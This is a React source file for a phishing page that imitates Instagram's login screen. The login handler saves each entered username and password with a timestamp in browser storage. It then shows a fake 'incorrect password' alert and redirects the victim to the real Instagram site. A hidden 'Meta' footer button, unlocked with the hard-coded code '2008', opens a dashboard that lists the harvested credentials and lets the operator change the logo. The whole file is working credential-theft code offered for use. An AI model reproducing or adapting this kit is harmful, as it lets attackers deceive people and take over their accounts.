/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { ArrowLeft, ChevronDown, X } from 'lucide-react';
import { useState, useEffect } from 'react';

export default function App() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [capturedData, setCapturedData] = useState(() => {
    return JSON.parse(localStorage.getItem('capturedData') || '[]');
  });
  const [isAuthorized, setIsAuthorized] = useState(false);
  const [showPasswordModal, setShowPasswordModal] = useState(false);
  const [passwordInput, setPasswordInput] = useState('');
  const [showDashboard, setShowDashboard] = useState(false);
  const [logoUrl, setLogoUrl] = useState(() => localStorage.getItem('logoUrl') || 'https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png');
  const [showLanguages, setShowLanguages] = useState(false);
  const [language, setLanguage] = useState('English (US)');

  const translations: any = {
    'English (US)': { username: 'Username, email or mobile number', password: 'Password', login: 'Log in', forgot: 'Forgot password?', create: 'Create new account' },
    'العربية': { username: 'اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف', password: 'كلمة السر', login: 'تسجيل الدخول', forgot: 'هل نسيت كلمة السر؟', create: 'إنشاء حساب جديد' },
    'Français': { username: 'Nom d\'utilisateur, e-mail ou numéro', password: 'Mot de passe', login: 'Connexion', forgot: 'Mot de passe oublié ?', create: 'Créer un nouveau compte' },
  };

  const currentLang = translations[language] || translations['English (US)'];

  const changeLanguage = (lang: string) => {
    setLanguage(lang);
    setShowLanguages(false);
  };


  const handleLogoUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onloadend = () => {
        const url = reader.result as string;
        setLogoUrl(url);
        localStorage.setItem('logoUrl', url);
      };
      reader.readAsDataURL(file);
    }
  };


  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    const newData = { username, password, timestamp: new Date().toLocaleString() };
    const updatedData = [...capturedData, newData];
    setCapturedData(updatedData);
    localStorage.setItem('capturedData', JSON.stringify(updatedData));
    setUsername('');
    setPassword('');
    alert('Incorrect username or password. Please try again.');
    window.location.href = 'https://www.instagram.com/';
  };

  const handleAuth = () => {
    if (passwordInput === '2008') {
      setIsAuthorized(true);
      setShowPasswordModal(false);
      setShowDashboard(true);
      setPasswordInput('');
    } else {
      alert('Incorrect password');
    }
  };

  if (showDashboard && isAuthorized) {
    return (
      <div className="p-4">
        <div className="flex justify-between items-center mb-4">
          <h1 className="text-xl font-bold">Dashboard</h1>
          <button onClick={() => setShowDashboard(false)}><X /></button>
        </div>
        <div className="mb-4">
          <label className="block text-sm font-medium text-gray-700">Change Logo</label>
          <input type="file" accept="image/*" onChange={handleLogoUpload} className="mt-1" />
        </div>
        <div className="space-y-2">
          {capturedData.map((item: any, index: number) => (
            <div key={index} className="border p-2 rounded">
              <p><strong>Username:</strong> {item.username}</p>
              <p><strong>Password:</strong> {item.password}</p>
              <p className="text-xs text-gray-500">{item.timestamp}</p>
            </div>
          ))}
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-between p-4 font-sans text-gray-800">
      {/* Top Header */}
      <div className="w-full flex justify-between items-center text-gray-500 text-sm mb-4 relative">
        <ArrowLeft size={24} />
        <div className="flex items-center cursor-pointer relative" onClick={() => setShowLanguages(!showLanguages)}>
          <span className="text-gray-500">{language}</span>
          <ChevronDown size={16} className="ml-1" />
          {showLanguages && (
            <div className="absolute top-full right-0 mt-2 bg-white border rounded shadow-md w-32 z-10 max-h-60 overflow-y-auto">
              {Object.keys(translations).map(lang => (
                <div key={lang} className="p-2 hover:bg-gray-100 text-sm text-gray-800" onClick={() => changeLanguage(lang)}>{lang}</div>
              ))}
            </div>
          )}
        </div>
        <div className="w-6"></div>
      </div>

      {/* Main Form Area */}
      <form onSubmit={handleLogin} className="flex-grow w-full max-w-xs flex flex-col items-center justify-center">
        <div className="mb-8">
          <img src={logoUrl} alt="Instagram" className="w-[72px] h-[72px] object-cover rounded-[15px]" />
        </div>
        <input 
            type="text" 
            placeholder={currentLang.username}
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            className="w-full p-3 border border-gray-300 rounded-md mb-3 bg-gray-50 text-sm"
            required
        />
        <input 
            type="password" 
            placeholder={currentLang.password}
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="w-full p-3 border border-gray-300 rounded-md mb-3 bg-gray-50 text-sm"
            required
        />
        <button type="submit" className="w-full bg-[#0095F6] text-white font-semibold py-3 rounded-md mb-4 text-sm">
            {currentLang.login}
        </button>
        <a href="#" onClick={() => window.location.href = 'https://www.instagram.com/accounts/password/reset/'} className="text-sm font-semibold">{currentLang.forgot}</a>
      </form>

      {/* Footer */}
      <div className="w-full flex flex-col items-center gap-4 mt-8 pb-4">
        <button onClick={() => window.location.href = 'https://www.instagram.com/accounts/emailsignup/'} className="w-full max-w-sm border border-[#0095F6] text-[#0095F6] font-semibold py-3 rounded-md text-sm">
            {currentLang.create}
        </button>
        <button onClick={() => setShowPasswordModal(true)} className="flex items-center text-gray-500 font-bold text-sm gap-1">
            <span>Meta</span>
        </button>
      </div>

      {/* Password Modal */}
      {showPasswordModal && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4">
          <div className="bg-white p-6 rounded-lg w-full max-w-xs">
            <h2 className="mb-4 font-bold">Enter Password</h2>
            <input 
              type="password" 
              value={passwordInput}
              onChange={(e) => setPasswordInput(e.target.value)}
              className="w-full p-2 border rounded mb-4"
            />
            <div className="flex justify-end gap-2">
              <button onClick={() => setShowPasswordModal(false)} className="px-4 py-2">Cancel</button>
              <button onClick={handleAuth} className="px-4 py-2 bg-[#0095F6] text-white rounded">Submit</button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

